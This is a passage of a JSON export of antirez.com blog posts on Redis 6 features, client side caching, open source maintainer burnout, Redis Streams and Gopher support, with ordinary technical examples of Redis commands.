meir@redislabs.com      5  chendianqiang      5  John Sully      4  dejun.xdj      4  Daniel Dai      4  Johannes Truschnigg      4  swilly22      3  Bruce Merry      3  filipecosta90      3  youjiali1995      2  James Rouzier      2  Andrey Bugaevskiy      2  Brad Solomon      2  Hamid Alaei      2  Michael Chaten      2  Steve Webster      2  Wander Hillen      2  Weiliang Li      2  Yuan Zhou      2  charsyam      2  hujie      2  jem      2  shenlongxing      2  valentino      2  zhudacai 00228490      2  \u559c\u6b22\u5170\u82b1\u5c71\u4e18  Thanks to all the above folks, it was a great team work ladies and gentlemen. The list of new features in the change log is the following:  * Many new modules APIs. * Better expire cycle. * SSL * ACLs * RESP3 * Client side caching * Threaded I/O * Diskless replication on replicas * Redis-benchmark cluster support + Redis-cli improvements * Systemd support rewrite. * Redis Cluster proxy was released with Redis 6 (but different repository). * A Disque module was released with Redis 6 (but different repository).  Many big things, as you can see. I\u2019ll spend a few words on selected ones.  RESP3 ===  After ten years we needed a new protocol, I talked extensively about it here http://antirez.com/news/125, but then changed my mind, so the RESP3 protocol in Redis 6 is \u201copt in\u201d. The connection starts in RESP2 mode, and only if you do a handshake using the new HELLO command, you enter in the new protocol mode.  Why a new protocol? Because the old one was not semantical enough. There are other features in RESP3, but the main idea was the ability to return complex data types from Redis directly, without the client having to know in what type to convert the flat arrays returned, or the numbers returned instead of proper boolean values, and so forth.  Since RESP3 is not the only protocol supported I expect the adoption to be slower than expected, but maybe this is not a bad thing after all: we\u2019ll have time to adapt.  ACLs ===  The best introduction to Redis ACLs is the ACL documentation itself (https://redis.io/topics/acl), even if probably it needs some update to match the last minute changes. So it\u2019s more interesting to talk about motivations here. Redis needed ACLs because people need ACLs in bigger environments, in order to control better which client can do certain operations. But another main point about adding ACLs to Redis was isolation in order to defend the data against application bugs. If your worker can only do BRPOPLPUSH, the chance of the new developer adding for debugging a FLUSHALL that ends in production code for error and creates a nightmare for 5 hours, is lower.  ACLs in Redis are for free, both operationally, because if you don\u2019t use them, you can avoid knowing they are supported at all, and from the point of view of performances, since the overhead is not measurable. I guess it\u2019s a good deal to have them. Bonus point, we have a Redis modules interface for ACLs now, so you can write custom authentication methods.  SSL ===  It\u2019s 2019, almost 2020, and there are new regulations. The only problem was doing it right. And doing it right required doing it wrong, understanding the limitations, and then abstracting the Redis connections in order to do it right. This work was entirely performed without my help, which shows how the Redis development process changed in recent times.  Client side caching ===  I blogged about it here http://antirez.com/news/130, however I think that right now this is the most immature feature of Redis 6. Yep, it\u2019s cool that the server can assist you in caching client side values, but I want to improve this before Redis 6 GA is out. Especially it could be very good to add a new mode that requires the server to maintain no state about clients, or very little state at all, and trade this with more messages. Moreover right now the messages to expire certain \u201ccache slots\u201d can\u2019t be compiled in a single one. There is more work to do in January about this feature, but it will be a good one.  Disque as a module ===  Finally I did it :-) https://github.com/antirez/disque-module, and I\u2019m very happy with the result. Disque as a module really shows how powerful is the Redis module system at this point. Cluster message bus APIs, ability to block and resume clients, timers, AOF and RDB control of module private data. If you don\u2019t know what Disque is, check the repository: the README is quite extensive.  Cluster Proxy ===  My colleague Fabio worked for months at this Redis Cluster proxy: https://github.com/artix75/redis-cluster-proxy. It is ages that I want to see it happening, the client landscape is very fragmented when the topic is Redis Cluster support, so now we have a (work in progress) proxy that can do many interesting things. The main one is to abstract the Redis Cluster for clients, like if they were talking to a single instance. Another one is to perform multiplexing, at least when it is simple and clients just use simple commands and features. When there is to block or to perform transactions, the proxy allocates a different set of connections for the client. The proxy is also completely threaded, so it can be a good way in order to maximize the CPU usage in case most of your CPU time is spent in I/O. Check the project README for status and give it a try!  Modules ===  With Redis 6 the modules API is totally at a new level. This is one of the part of Redis that matured faster in our history, because Redis Labs used the modules system from day zero in order to develop very complex stuff, not just trivial examples. Some time ago I started the Disque port, and this also motivated to bring me new features to the modules system. The result is that Redis is really a framework in order to write systems as modules, without having to invent everything from scratch, and being BSD licensed, Redis is really an open platform to write systems.  Internals ===  There are tons of improvements to the Redis internals: the way commands are replicated changed quite a bit, the expires are now using a different algorithm which is faster and more cache obvious.  Status and ETA ===  Today we went RC1, and I hope that between end of March, or at worst, May, you\u2019ll see the GA ready. Right now Redis 6 is definitely testable and the chance you run into a bug is very small. Yet it includes a ton of code changes, and the new features are composed of new code that nobody ran in production before. So if you find bad things, please report them in the issue system describing at your best what happened.  Thanks everybody that made this release possible and that will work in the next months to bring it to a very stable state.  Oh, I almost forgot! This is the LOLWUT command interactive art for version 6:  img://antirez.com/misc/lolwut6.png  Every run displays a different landscape that is randomly generated. Comments", "content": "", "cover_photo_url": "http://antirez.com/misc/lolwut6.png", "profile": 4, "updated_on": "2019-12-19T16:27:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 9839.0747411, "slug": "redis-6-rc1-is-out-today-9", "topics": []}}, {"model": "app.post", "pk": 10, "fields": {"title": "Client side caching in Redis 6", "link": "http://antirez.com/news/130", "source": 1, "normalized_link": "antirez.com/news/130", "summary": "[Note: this post no longer describes the client side implementation in the final implementation of Redis 6, that changed significantly, see https://redis.io/topics/client-side-caching]  The New York Redis day was over, I get up at the hotel at 5:30, still pretty in sync with the Italian time zone and immediately went walking on the streets of Manhattan, completely in love with the landscape and the wonderful feeling of being just a number among millions of other numbers. Yet I was thinking at the Redis 6 release with the feeling that, what was probably the most important feature at all, the new version of the Redis protocol (RESP3), was going to have a very slow adoption curve, and for good reasons: wise people avoid switching tools without very good reasons. After all why I wanted to improve the protocol so badly? For two reasons mainly, to provide clients with more semantical replies, and in order to open to new features that were hard to implement with the old protocol; one feature in particular was the most important to me: client side caching.  Rewind back to about one year ago. I arrived at Redis Conf 2018, in San Francisco, with the firm idea that client side caching was the most important thing in the future of Redis. If we need fast stores and fast caches, then we need to store a subset of the information inside the client. It is a natural extension of the idea of serving data with small delays and at a big scale. Actually almost every very large company already does it, because it is the only way to survive to the load eventually. Yet Redis had no way to assist the client in such process. A fortunate coincidence wanted Ben Malec having a talk at Redis Conf exactly about client side caching [1], just using the tools that Redis provides and a number of very clever ideas.  [1] https://www.youtube.com/watch?v=kliQLwSikO4  The approach taken by Ben really opened my imagination. There were two key ideas Ben used in order to make his design work. The first was to use the Redis Cluster idea of \u201chash slots\u201d in order to divide keys into 16k groups. That way clients would not need to track the validity of each key, but could use a single metadata entry for a group of keys. Ben used Pub/Sub in order to send the notifications when keys where changed, so he needed some help by the application in all its parts, however the schema was very solid. Modify a key? Also publish a message invalidating it. On the client side, are you caching keys? Remember the timestamp at which you cache each key, and also when receiving invalidation messages, remember the invalidation time for each slot. When using a given cached key, do a lazy eviction, by checking if the key you cached has a timestamp which is older than the timestamp of the invalidation received for the slot this key belongs to: in that case the key is stale data, you have to ask the server again.  After watching the talk, I realized that this was a great idea to be used inside the server, in order to allow Redis to do part of the work for the client, and make client side caching simpler and more effective, so I returned home and wrote a document describing my design [2].  [2] https://groups.google.com/d/msg/redis-db/xfcnYkbutDw/kTwCozpBBwAJ  But to make my design working I had to focus on switching the Redis protocol to something better, so I started writing the specification and later the code for RESP3, and the other Redis 6 things like ACL and so forth, and client side caching joined the huge room of the many ideas for Redis that I abandoned in some way or the other for lack of time.  Yet I was among the streets of New York thinking about this idea. Later went to lunch and coffee break with friends from the conference. When I returned to my hotel room I had all the evening left, and most of the next day before the flight, so I started writing the implementation of client side caching for Redis 6, closely following the proposal I wrote to the group one year ago: it still looked great.  Redis server-assisted client side caching, finally called \u201ctracking\u201d (but I may change idea), is a very simple feature composed of just a few key ideas.  The key space is split into \u201ccaching slots\u201d, but they are a lot more than the hash slots used by Ben. We use 24 bits of the output of CRC64, so there are a bit more than 16 millions different slots. Why so much? Because I think you want to have a server with 100 millions of keys, and yet an invalidation message should not affect more than a few keys in the client side cache. The memory overhead inside Redis to take the invalidation table is 130 megabyte: an array of 8 bytes pointers to 16M entries. That\u2019s ok with me, if you want the feature you are going to make a great use of all the memory you have in the clients, so to use 130MB server side is fine; what you win is a much more fine grained invalidation.  Clients enable the feature in an \u201copt in\u201d way, with a simple command:      CLIENT TRACKING on  The server replies the good old +OK, and starting from that moment, every command that is flagged as \u201cread only\u201d in the command table, will not just return the keys to the caller, it will also, as a side effect, remember the caching slots of all the keys the client requested so far (but only the ones using a read only command, that's the agreement between the server and the client). The way Redis stores this information is simple. Each Redis client has an unique ID, so if client ID 123 performs an MGET about keys hashing to the slot 1, 2, and 5, we\u2019ll have the Invalidation Table with the following entry:  1 -> [123] 2 -> [123] 5 -> [123]  But later also client ID 444 will ask about keys in the slot 5, so the table will be like:  5 -> [123, 444]  Now some other client changes some key in the slot 5. What happens is that Redis will check the Invalidation Table, to find that both clients 123 and 444 may have cached keys on that slot. We\u2019ll send an invalidation message to both clients, as a result they will be free to deal with it in any form: either remember with a timestamp the last time the slot was invalidate, and check later in a lazy way the timestamp (or incremental \u201cepoch\u201d if you like it more: it is safer) of the cached object, and evict it based on the comparison. Otherwise the client is free to reclaim the objects directly, by taking a table of what it cached about this specific slot. This approach with a 24 bit hash function is not an issue, because we\u2019ll not have a very long list at all, even when caching tens of millions of keys. After sending the invalidation messages, we can remove the entries from the invalidation table, this way we'll no longer send invalidation messages to those clients until they don't read again keys for such slot.  Note that clients are not forced to really use all the 24 bits of the hash function. They may just use, for instance, 20 bits, and then also shift the invalidation messages slots that Redis sends them. Not sure if there are many good reasons to do that, but in memory constrained systems may be an idea.  If you followed closely what I said, you are thinking that the same connection receives both the normal client replies, and the invalidation messages. This is possible with RESP3, because invalidations are sent as \u201cpush\u201d message types. Yet if the client is a blocking one, and not an event driven client, this starts to be complex: the application need some way to read new data from time to time, and that looks complex and fragile. It is perhaps, in that case, much better to use another application thread, and a different client connection, in order to receive the invalidation messages. So you are allowed to do the following:      CLIENT TRACKING on REDIRECT 1234  Basically we can say that all the keys we get with the current connection, we want the invalidation message to be sent to client 1234 instead. Multiple clients may ask to have the invalidation messages redirected to a single client for instance, in case of connection pools. All you need to do is to create this special connection to receive the invalidation messages, call CLIENT ID to know which ID this client connection has, and later enable tracking.  There is one problem left: what happens if we lose the connection with the server from the invalidation link? We may run into troubles since invalidation messages will no longer be received. Normally the application will detect the link is severed, and will reconnect again, flushing the current cache (or taking more soft resolutions, like putting all the timestamps for the slots a few seconds in the future to have some time to populate the cache while serving data that may be a few seconds stale). Yet it may be a better idea if the invalidation thread pings from time to time the connection to make sure it is alive. However in order to reduce the risk of stale data, Redis will also start to inform the clients that redirected the invalidation messages to some other client, that is now disconnected, about the situation, just using special push messages: at the next query performed the client will know.  What I described was just merged into Redis unstable. Probably it\u2019s not the final word, but we have more months before the first Redis 6 release candidate, there is time to change everything: just send me your feedbacks. I\u2019m also looking at ways to enable the feature for RESP2. That would work only when redirection is enabled, and the client listening for messages should probably go into Pub/Sub mode so that we could send kinda of Pub/Sub messages. In this way old clients can be fully reused.  I hope this was enough to stimulate your appetite: if we execute this inside Redis very well, and then document it for the client authors to know how to provide support, data may go a lot nearer to the application than ever, even in applications ran by small teams that so far avoided trying to implement client side caching. For large teams and very large applications doing this already, the overhead could be reduced, together with the complexity of the implementation. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2019-07-04T17:10:34Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 9516.57283, "slug": "client-side-caching-in-redis-6-10", "topics": []}}, {"model": "app.post", "pk": 11, "fields": {"title": "The struggles of an open source maintainer", "link": "http://antirez.com/news/129", "source": 1, "normalized_link": "antirez.com/news/129", "summary": "Months ago the maintainer of an OSS project in the sphere of system software, with quite a big and active community, wrote me an email saying that he struggles to continue maintaining his project after so many years, because of how much psychologically taxing such effort is. He was looking for advices from me, I\u2019m not sure to be in the position of giving advices, however I told him I would write a blog post about what I think about the matter. Several weeks passed, and multiple times I started writing such post and stopped, because I didn\u2019t had the time to process the ideas for enough time. Now I think I was able to analyze myself to find answers inside my own weakness, struggles, and desire of freedom, that inevitably invades the human minds when they do some task, that also has some negative aspect, for a prolonged amount of time. Maintaining an open source project is also a lot of joy and fun and these latest ten years of my professional life are surely memorable, even if not the absolute best (I had more fun during my startup times after all). However here I\u2019ll focus on the negative side; simply make sure you don\u2019t get the feeling it is just that, there is also a lot of good in it.  Flood effect  I don\u2019t believe in acting fast, thinking fast, winning the competition on time and stuff like that. I don\u2019t like the world of constant lack of focus we live in, because of social networks, chats, emails, and a schedule full of activities. So when I used to receive an email about Redis back in the early times of the project, when I still had plenty of time, I was able to focus on what the author of the message was trying to tell me. Then I could recall the relevant part of Redis we were discussing, and finally reply with my real thoughts, after considering the matter with care. I believe this is how most people should work regardless of what their job is.  When a software project reaches the popularity Redis reached, and at the same time once the communications between individuals are made so simple by the new social tools, and by your attitude to be \u201cthere\u201d for users, the amount of messages, issues, pull requests, suggestions the authors receive will grow exponentially. At the same time, at least in the case of Redis, but I believe this to be a common problem, the amount of very qualified people that can look at such inputs from the community grows very slowly. This creates an obvious congestion. Most people try to address it in the wrong way: using pragmatism. Let\u2019s close the issue after two weeks of no original poster replies, after we ask some question. Close all the issues that are not very well specified. And other \u201cinbox zero\u201d solutions. The reality is that to process community feedbacks very well you have to take the time needed, otherwise you will just pretend your project has a small number of open issues. Having a lot of resources to hire core-level experts for each Redis subsystem, to work at OSS full time, would work but is not feasible.  So what happens? That you start to prioritize more and more what to look at and what not. And you feel you are a piece of shit at ignoring so many things and people, and also the contributor believes you don\u2019t care about what others have to give you. It\u2019s a complex situation. Usually the end result is to develop an attitude to mostly address critical issues and disregard all the new stuff, since new stuff are yet not in the core, and who wants to have a larger code base with even more PRs and issues there? Maybe also written in a more convoluted way compared to your usual programming style, so, more complexity, and good luck when there is a critical bug there to track the root cause.  Role shifting  As a result of the \u201cflood effect\u201d problem exposed above, you suddenly also change job. Redis became popular because I supposedly am able to design and write software. And now instead most of the work I do is to look at issues and pull requests, and I also feel that I could do better many of the contributions I receive. Some will be better quality than I could do, because there are also better programmers than me contributing to Redis, but *most* for the nature of big numbers will be average contributions that are just written to solve a given problem that was contingent for the folks that submitted it. While, when I design for Redis, I tend to think at Redis as a whole, because it\u2019s years I write this thing. So what you were good at, you have no longer time to do. This in turn means less organic big new features. My solution with that? Sometimes I just stop looking at issues and PRs for weeks, because I\u2019m coding or designing: that is the work I really love and enjoy. However this in turn creates ways more pressure on me, psychologically. To do what I love and I can do well I\u2019ve to feel like shit.  Time  There are two problems related to working at the same project for a prolonged amount of time, at least for me. First, before of the Redis experience I *never* worked every week day of my life. I could work one week, stop two, then work one month, then disappear for other two months. Always. People need to recharge, get new energy and ideas, to do creative work. And programming at high level is a fucking creative job. Redis itself was created like that for the first two years, that is, when the project evolved at the fastest speed. Because the sum of the productivity of me working just when I want is greater than the productivity I\u2019ve when I\u2019m forced to work every day in a steady way.  However my work ethics allowed me to have a very discontinue schedule when I was working alone with my companies. Once I started to receive money to work at Redis, it was no longer possible for my ethics to have my past pattern, so I started to force myself to work under normal schedules. This for me is a huge struggle, for many years at this point. Moreover I\u2019m sure I\u2019m doing less than I could because of that, but this is how things work. I never found a way to solve this problem. I could say Redis Labs that I want to return to my old schedule, but that would not work because at this point I really \u201creport\u201d to the community, not to the company.  Another problem is that working a lot at the same project is also a complex matter, mentally speaking. I used to change project every six months in the past. Now for ten years I did the same thing. In that regard I tried to save my sanity by having sub-projects inside Redis. One time I did Cluster, another time disk-storage (now abandoned), another was HyerLogLogs, and so forth. Basically things that bring value to the project but that, in isolation, are other stuff. But eventually you have to return back to the issues and PRs page and address the same things every day. \u201cReplica is disconnecting because of a timeout\u201d or whatever. Let\u2019s investigate that again.  Fear  I always had some fear to lose the technological leadership of the project. Not because I think I\u2019m not good enough at designing and evolving Redis, but because I know my ways are not aligned with: 1) what a sizable amount of users want. 2) what most people in IT believe software is. So I had to constantly balance between what I believe to be good design, set of features, speed of development (slow), size of the project (minimal), and what I was expected to deliver by most of the user base. Fortunately there is a percentage of Redis users that understand perfectly the Redis-way, so at least from time to time I can get some word of comfort.  Frictions  Certain people are total assholes. They are everywhere, it is natural and if you ask me, I even believe in programming there are a lot more nice people than in other fields. But yet you\u2019ll always see a percentage of total jerks. As the leader of a popular OSS project, in one way or the other you\u2019ll have to confront with these people, and that\u2019s maybe one of the most stressful things I ever did in the course of the Redis development.  Futileness  Sometimes I believe that software, while great, will never be huge like writing a book that will survive for centuries. Note because it is not as great per-se, but because as a side effect it is also useful\u2026 and will be replaced when something more useful is around. I would like to have time to do other activities as well. So sometimes I believe all I\u2019m doing is, in the end, futile. We\u2019ll design and write systems, and new systems will emerge; but anyone that just stays in software, instead of staying in \u201csoftware big ideas\u201d, will ever set a new mark? From time to time I think I had potentially the ability to work at big ideas but because I focused on writing software instead of thinking about software, I was not able to use my potential in that regard. This is basically the contrary of the impostor syndrome, so I guess I\u2019ve a big idea of myself: sorry for that I should be more humble.  That said, I was able to work for many years doing things I really loved, that gave me friends, recognition, money, so I don\u2019t want to say it was a bad deal. Yet I totally understand people struggling a lot to stay afloat once their projects start to be popular. This blog post is dedicated to them. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2019-05-16T17:42:18Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 9422.5351411, "slug": "the-struggles-of-an-open-source-maintainer-11", "topics": []}}, {"model": "app.post", "pk": 12, "fields": {"title": "Redis streams as a pure data structure", "link": "http://antirez.com/news/128", "source": 1, "normalized_link": "antirez.com/news/128", "summary": "The new Redis data structure introduced in Redis 5 under the name of \u201cStreams\u201d generated quite some interest in the community. Soon or later I want to run a community survey, talking with users having production use cases, and blogging about it. Today I want to address another issue: I\u2019m starting to suspect that many users are only thinking at Streams as a way to solve Kafka(TM)-alike use cases. Actually the data structure was designed to *also* work in the context of messaging with producers and consumers, but to think that Redis Streams are just good for that is incredibly reductive. Streaming is a terrific pattern and \u201cmental model\u201d that can be applied when designing systems with great success, but Redis Streams, like most Redis data structures, are more general, and can be used to model dozen of different unrelated problems. So in this blog post I\u2019ll focus on Streams as a pure data structure, completely ignoring its blocking operations, consumer groups, and all the messaging parts.  ## Streams are CSV files on steroids  If you want to log a series of structured data items and decided that databases are overrated after all, you may say something like: let\u2019s just open a file in append only mode, and log every row as a CSV (Comma Separated Value) item:  (open data.csv in append only) time=1553096724033,cpu_temp=23.4,load=2.3 time=1553096725029,cpu_temp=23.2,load=2.1  Looks simple and people did this for ages and still do: it\u2019s a solid pattern if you know what you are doing. But what is the in-memory equivalent of that? Memory is more powerful than an append only file and can automagically remove the limitations of  a CSV file like that:  1. It\u2019s hard (inefficient) to do range queries here.  2. There is too much redundant information: the time is almost the same in every entry and the fields are duplicated. At the same time removing it will make the format less flexible, if I want to switch to a different set of fields.  3. Item offsets are just the byte offset in the file: if we change the file structure the offset will be wrong, so there is no actual true concept of primary ID here. Entries are basically not univocally addressed in some way.  4. I can\u2019t remove entries, but only mark them as no longer valid without the ability of garbage collecting, if not by rewriting the log. Log rewriting usually sucks for several reasons and if it can be avoided, it\u2019s good.  Still such log of CSV entries is also great in some way: there is no fixed structure and fields may change, is trivial to generate, and after all is quite compact as well. The idea with Redis Streams was to retain the good things, but go over the limitations. The result is a hybrid data structure very similar to Redis Sorted Sets: they *feel like* a fundamental data structure, but to get such an effect, internally it uses multiple representations.  ## Streams 101 (you may skip that if you know already Redis Stream basics)  Redis Streams are represented as delta-compressed macro nodes that are linked together by a radix tree. The effect is to be able to seek to random entries in a very fast way, to obtain ranges if needed, remove old items to create a capped stream, and so forth. Yet our interface to the programmer is very similar to a CSV file:  > XADD mystream * cpu-temp 23.4 load 2.3 \"1553097561402-0\" > XADD mystream * cpu-temp 23.2 load 2.1 \"1553097568315-0\"  As you can see from the example above the XADD command auto generates and returns the entry ID, which is monotonically incrementing and has two parts: -. The time is in milliseconds and the counter increases for entries generated in the same milliseconds.   So the first new abstraction on top of the \u201cappend only CSV file\u201d idea is that, since we used the asterisk as the ID argument of XADD, we get the entry ID for free from the server. Such ID is not only useful to point to a specific item inside a stream, it\u2019s also related to the time when the entry was added to the stream. In fact with XRANGE it is possible to perform range queries or fetch single items:  > XRANGE mystream 1553097561402-0 1553097561402-0 1) 1) \"1553097561402-0\"    2) 1) \"cpu-temp\"       2) \"23.4\"       3) \"load\"       4) \"2.3\"  In this case I used the same ID as the start and the stop of the range in order to identify a single element. However I can use any range, and a COUNT argument to limit the number of results. Similarly there is no need to specify full IDs as range, I can just use the millisecond unix time part of the IDs, to get elements in a given range of time:  > XRANGE mystream 1553097560000 1553097570000 1) 1) \"1553097561402-0\"    2) 1) \"cpu-temp\"       2) \"23.4\"       3) \"load\"       4) \"2.3\" 2) 1) \"1553097568315-0\"    2) 1) \"cpu-temp\"       2) \"23.2\"       3) \"load\"       4) \"2.1\"  For now there is no need to show you more Streams API, there is the Redis documentation for that. For now let\u2019s just focus on that usage pattern: XADD to add stuff, XRANGE (but also XREAD) in order to fetch back ranges (depending on what you want to do), and let\u2019s see why I claim Streams are so powerful as a data structure.  However if you want to learn more about Redis Streams and their API, make sure to visit the tutorial here: https://redis.io/topics/streams-intro  ## Tennis players  A few days ago I was modeling an application with a friend of mine which is learning Redis those days: an app in order to keep track of local tennis courts, local players and matches. The way you model players in Redis is quite obvious, a player is a small object, so an Hash is all you need, with key names like player:. As you model the application data further, to use Redis as its primary, you immediately realize you need a way to track the games played in a given tennis club. If player:1 and player:2 played a game, and player 1 won, we could write the following entry in a stream:  > XADD club:1234.matches * player-a 1 player-b 2 winner 1 \"1553254144387-0\"  With this simple operation we have:  1. A unique identifier of the match: the ID in the stream. 2. No need to create an object in order to identify a match. 3. Range queries for free to paginate the matches, or check the matches played in a given moment in the past.  Before Streams we needed to create a sorted set scored by time: the sorted set element would be the ID of the match, living in a different key as a Hash value. This is not just more work, it\u2019s also an incredible amount of memory wasted. More, much more you could guess (see later).  For now the point to show is that Redis Streams are kinda of a Sorted Set in append only mode, keyed by time, where each element is a small Hash. And in its simplicity this is a revolution in the context of modeling for Redis.  ## Memory usage  The above use case is not just a matter of a more solid pattern. The memory cost of the Stream solution is so different compared to the old approach of having a Sorted Set + Hash for every object that makes certain things that were not viable, now perfectly fine.  Those are the numbers for storing one million of matches in the configurations exposed previously:  Sorted Set + Hash memory usage = 220 MB (242 RSS) Stream memory usage                  = 16.8 MB (18.11 RSS)  This is more than an order of magnitude difference (13 times difference exactly), and it means that use cases that yesterday were too costly for in-memory now are perfectly viable. The magic is all in the representation of Redis Streams: the macro nodes can contain several elements that are encoded in a data structure called listpack in a very compact way. Listpacks will take care, for instance, to encode integers in binary form even if they are semantically strings. On top of that, we then apply delta compression and same-fields compression. Yet we are able to seek by ID or time because such macro nodes are linked in the radix tree, which was also designed to use little memory. All these things together account for the low memory usage, but the interesting part is that semantically the user does not see any of the implementation details making Streams efficient.  Now let\u2019s do some simple math. If I can store 1 million entries in about 18 MB of memory, I can store 10 millions in 180 MB, and 100 millions in 1.8 GB. With just 18 GB of memory I can have 1 billion items.  ## Time series  One important thing to note is, in my opinion, how the usage above where we used a Stream to represent a tennis match was semantically *very different* than using a Redis Stream for a time series. Yes, logically we are still logging some kind of event, but one fundamental difference is that in one case we use the logging and the creation of entries in order to render objects. While in the case of time series, we are just metering something happening externally, that does not really represent an object. You may think that this difference is trivial but it\u2019s not. It is important for Redis users to build the idea that Redis Streams can be used in order to create small objects that have a total order, and assign IDs to such objects.  However even the most basic use case of time series is, obviously, a huge one here, because before Streams Redis was a bit hopeless in regard to such use case. The memory characteristics and flexibility of streams, plus the ability to have capped streams (see the XADD options), is a very important tool in the hands of the developer.  ## Conclusions  Streams are flexible and have lots of use cases, however I wanted to take this blog post short to make sure that there is a clear take-home message in the above examples and analysis of the memory usage. Perhaps this was already obvious to many readers, but talking with people in the last months gave me the feeling that there was a strong association between Streams and the streaming use case, like if the data structure was only good at that. That\u2019s not the case :-) Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2019-03-22T15:10:15Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 9316.7324078, "slug": "redis-streams-as-a-pure-data-structure-12", "topics": []}}, {"model": "app.post", "pk": 13, "fields": {"title": "Gopher: a present for Redis", "link": "http://antirez.com/news/127", "source": 1, "normalized_link": "antirez.com/news/127", "summary": "Ten years ago Redis was announced on Hacker News, and I use this as virtual birthdate for the project, simply because it is more important when it was announced to the public than the actual date of the project first line of code (think at it conception VS actual birth in animals).  I\u2019ll use the ten years of Redis as an excuse to release something I played a bit in the previous days, thinking to use it for the 1st April fool: but such date is far and I want to talk to you about this project now\u2026 So, happy birthday Redis! Here it\u2019s your present: a Gopher protocol implementation.  [\u2026 here Redis tries to stop the tears, but the emotion is too strong and there are bits (I mean zeros and ones) on the floor \u2026]  WTF are you saying?! should be your automatic question. Gopher in 2019 sounds a bit strange. However it is not *just* a joke, while it is largely a joke. The implementation is just 100 lines of code after all, excluding the external tool to render the pages into Redis keys. But\u2026 the thing is that there is really an active community around Gopher, a very small one but one that is growing in the latest years and months. There are people that feel that internet is no longer what it used to be. There is too much control, companies tracking, comments, likes, retweets, to the point that the content is no longer the king. One writes new things for them to be popular for 5 hours and disappear. There is no longer a discussion that can survive more than a few minutes without becoming some kind of flame, unless all the parties self-censor every possible feeling, uneasy word, and belief, to the point to make the discussion quite useless. Finally to load a stupid page with 1k of text requires to load 50 javascript files, to see the screen flickering since client-side rendering is cool, and so forth.  On the other hand Gopher is a text only protocol that is great to deliver text only documents where the stress is in what you write. But that would be fetichism, for me the silver bullet of Gopher is that it is UNCOOL. Uncool enough that it will be forever, AFAIK, an alternative reality where certain folks can decide to separate from the rest, to experience a different way to do things, more similar to the old times of BBSs or the first years of the internet. A place where most people will not want to go just to read nerdy stuff in an 80 columns fixed size font.  What you do in Gopher is to create your Gopher hole, that is, your space inside the Gopher universe, like your web site on the internet basically. There was no shortage of tools to do that already, but Redis is quite nice for a few reasons: you can change the Redis keys to change the site content in real time, that\u2019s handy. You can use replication in order to duplicate a site, and can even just save your RDB file to have an exact copy of the whole Gopher hole to archive for backup or historical reasons.  This Redis Gopher concept was created with the collaboration of Freaknet, a historical hacking laboratory experience here in Catania. https://it.wikipedia.org/wiki/FreakNet. Those folks do a lot of interesting stuff, including a retrocomputing hardware museum project in Palazzolo Acreide here: https://museo.freaknet.org/en/.  How it works?  Well it\u2019s trivial, I hijacked the inline protocol, and specifically two kind of inline requests that were anyway illegal: an empty request or any request that starts with \"/\" (there are no Redis commands starting with such a slash). Normal RESP2/RESP3 requests are completely out of the path of the Gopher protocol implementation and are served as usually as well. If you open a connection to Redis when Gopher is enabled and send it a string like \"/foo\", if there is a key named \"/foo\" it is served via the Gopher protocol. The whole implementation is 100 lines of code. Initially I thought about using data structures and have semantical transformations to Gopher types, but that\u2019s just complex and useless.  Instead what I did was to provide an authoring tool for Gopher over Redis, you can find it here:  \thttps://github.com/antirez/gopher2redis  To see that example Gopher hole running on a Redis instance just go to gopher://gopher.antirez.com, and btw that will be the address of my Gopher hole once I\u2019ll build one in the next days. P.S. I suggest using the Lynx text only web/gopher browser to access Gopher.  The gopher support is disabled by default, to enable it use the Redis unstable branch and use the \u201cgopher-enabled\u201d option, setting it to yes. However MAKE SURE to also password protect Redis: the Gopher protocol will still serve content, but at the same time normal Redis commands will not be accessible. This way (and assuming you don\u2019t have data other than your Gopher keys to expose in the instance) you could make the instance public, as a true Gopher server.  Well, have fun with Gopher! I hope this Gopher thing will go forward, I really believe there are a few of us that need to create a community outside the chaos of the modern Internet. No, it will not be possible to have no interactions. For instance I\u2019ve no plans to stop blogging or using Internet. But certain slower higher quality communications need a place to prosper. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2019-02-25T17:17:23Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 9268.9019189, "slug": "gopher-a-present-for-redis-13", "topics": []}}, {"model": "app.post", "pk": 14, "fields": {"title": "An update about Redis developments in 2019", "link": "http://antirez.com/news/126", "source": 1, "normalized_link": "antirez.com/news/126", "summary": "Yesterday a concerned Redis user wrote the following on Hacker News:  \u2014 https://news.ycombinator.com/item?id=19204436 \u2014 I love Redis, but I'm a bit skeptical of some of the changes that are currently in development. The respv3 protocol has some features that, while they sound neat, also could significantly complicate client library code. There's also a lot of work going into a granular acl. I can't imagine why this would be necessary, or a higher priority than other changes like multi-thread support, better persistence model, data-types, etc. \u2014 end of user comment \u2014  I\u2019ve the feeling she/he (not sure) is not the only one that looks at ACLs as some sort of feature imposed by the Redis Labs goals, because \u201centerprise users\u201d or something like that. Also the other points in the comment are interesting, and I believe everything is very well worth addressing in order to communicate clearly with the Redis community what\u2019s the road ahead.  For simplicity I\u2019ll split this blog post into sections addressing every single feature mentioned in the original comment.  ## RESP3  The goal of RESP3, as I already blogged in these pages, is to actually simplify the clients landscape. Hopefully every client will have a lower layer that will not try to reinvent some kind of higher level interface: redis.call(\u201cget\u201d,\u201dfoo\u201d). There is no longer need to orchestrate conversions because now the protocol is semantical enough to tell the client what a given reply should look like in the hand of the caller, nor any need to know beforehand the command fingerprint for the majority of commands. What I think the user is referring is RESP3 support for out of band communications, that is the reply \u201cattributes\u201d.  I really believe that in the future of Redis \u201cclient side caching\u201d will be a big thing. It\u2019s the logical step in every scalable system. However without server assistance client side cache invalidation is a nightmare. This is the reason why RESP3 supports attributes in replies, mainly. However probably Redis 6 *will not implement any of that*. Redis unstable, that will become Redis 6, already has a RESP3 implementation that is almost complete, and there are no attributes. The clients implementing RESP3 can just decide to discard attributes if they are willing to be really future-proof, and likely attributes will not be sent at all anyway even for future Redis versions if the user did not activate some kind of special feature. For instance, for client side caching, the connection will have to be put in some special mode. 